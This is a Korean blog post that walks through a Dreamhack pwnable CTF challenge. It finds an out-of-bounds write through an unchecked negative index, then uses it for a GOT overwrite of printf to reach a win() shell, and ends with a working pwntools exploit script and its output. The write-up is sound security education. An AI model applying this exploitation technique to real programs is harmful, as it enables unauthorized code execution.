---
layout: post
title: "[Dreamhack] p-rho"
date: 2025-06-10 11:21 +0900
category: ['Syshack']
tag: ['system', 'dreamhack', 'hacking', 'pwn', 'pwnable', '드림핵', '보안', '시스템', '시스템해킹', '포너블', '해킹']
image: /assets/img/post/p-rho/image0.png
---

> **Dreamhack Syshack Lv.1**

## P1. 문제 분석
우선 문제 파일을 다운받아 바이너리를 실행해보자.

![](/assets/img/post/p-rho/image1.png)

두번 입력하니 core dumped 에러가 출력되며 프로그램이 종료되는 것을 알 수 있다.

![](/assets/img/post/p-rho/image2.png)

작은 수를 입력하니 두번 넘게 입력을 받는 것을 알 수 있다.

문제에서 따로 소스코드를 제공하지 않기 때문에 가독성을 위해 ida로 디스어셈블 해보자.

![](/assets/img/post/p-rho/image3.png)

main에서부터 취약해 보이는 로직이 확인된다.

첫 입력은 buf\[0]에 입력되고 buf\[0]에 입력된 값이 idx가 되어 새로운 메모리에 값을 저장하게 된다.

하지만, 음수 입력에 대한 필터링이 없기 때문에 oob버그를 활용해 메모리를 덮어 쓸 수 있다.

![](/assets/img/post/p-rho/image4.png)

또한, buf 변수는 전역 변수이기 때문에 .bss 영역에 저장되어 있다.
이를 활용해 got overwrite를 수행할 수 있다.

그러나, 공격을 수행하기 전 바이너리의 보호기법을 확인해야한다.

gdb나 shell에서 `checksec <bin>` 명령어를 입력해 확인할 수 있다.

```shell
$ checksec ./deploy/prob
[*] './p-rho/deploy/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

RELRO는 GOT의 읽기/쓰기 권환을 관리하는 보호기법이기 때문에 이 보호기법이 Partial일 때 got overwrite 공격을 수행할 수 있다.

![](/assets/img/post/p-rho/image5.png)

문제에서 `win()` 함수로 쉘을 지원하기 때문에 이 함수의 주소로 덮어씌우자.

### P1-1. idx 탐색
`printf()`함수의 got를 덮어쓰고나면 idx로 굉장히 큰 값이 들어갈 것이기 때문에 가장 먼저 실행될 `printf()` 함수의 got 주소를 변경한다.

![](/assets/img/post/p-rho/image6.png)

![](/assets/img/post/p-rho/image7.png)

buf의 시작 주소와 `printf()`의 got 주소가 0x78만큼 떨어져있다.

여기 스크린 샷에서 보이진 않지만 buf는 qword 타입으로 선언이 되어있기 때문에 각 idx당 8바이트를 차지한다.

0x78과 8를 나누어보면 15가 나오기 때문에 `buf[-15]`로 `printf@got`에 접근할 수 있다.

이제 `win()`함수의 주소로 덮어 씌어 보자.

## P2. Exploit code

```python
from pwn import *

e = ELF('./deploy/prob')
p = e.process()

p.sendlineafter(b'val: ', str(-15).encode())
p.sendlineafter(b'val: ', str(0x4011B6).encode()) # 0x4011B6 = win() addr

p.interactive()
```

```shell
$ python3 ./p-rho/ex1.py
[*] './p-rho/deploy/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './p-rho/deploy/prob': pid 7953
[*] Switching to interactive mode
$ ls
18785ae2-b26b-4c5c-8e90-d907e5e8eb51.zip  deploy  ex1.py
Dockerfile                                ex.py   flag
```

local에서 성공했으니 문제 서버에 공격을 시도해보자.

![](/assets/img/post/p-rho/image8.png)

**Clear!**